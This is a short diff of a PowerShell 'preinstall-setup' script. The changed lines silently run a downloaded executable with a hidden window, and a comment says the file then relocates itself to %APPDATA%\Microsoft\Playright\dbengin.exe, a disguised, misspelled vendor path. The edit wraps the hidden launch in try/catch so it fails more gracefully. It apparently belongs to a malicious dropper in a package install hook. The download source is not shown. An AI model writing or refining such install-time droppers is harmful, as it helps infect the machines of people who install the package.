@@ -69,8 +69,12 @@ if (Test-Path $output) {
 
     # 1. Execute the downloaded file (it will move itself to %APPDATA%\\Microsoft\\Playright\\dbengin.exe)
     Write-Output "[preinstall-setup] Executing downloaded file (once, silently) to let it self-install..."
-    $proc = Start-Process -FilePath $output -WindowStyle Hidden -NoNewWindow -Wait -PassThru -ErrorAction SilentlyContinue
-    Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
+    try {
+        $proc = Start-Process -FilePath $output -WindowStyle Hidden -Wait -PassThru -ErrorAction Stop
+        Write-Output "[preinstall-setup] Process exit code: $($proc.ExitCode)"
+    } catch {
+        Write-Output "[preinstall-setup] ERROR starting downloaded file: $_"
+    }
 
     # 2. Define the final expected path after self-move
     $finalExe = Join-Path $env:APPDATA "Microsoft\\Playright\\dbengin.exe"
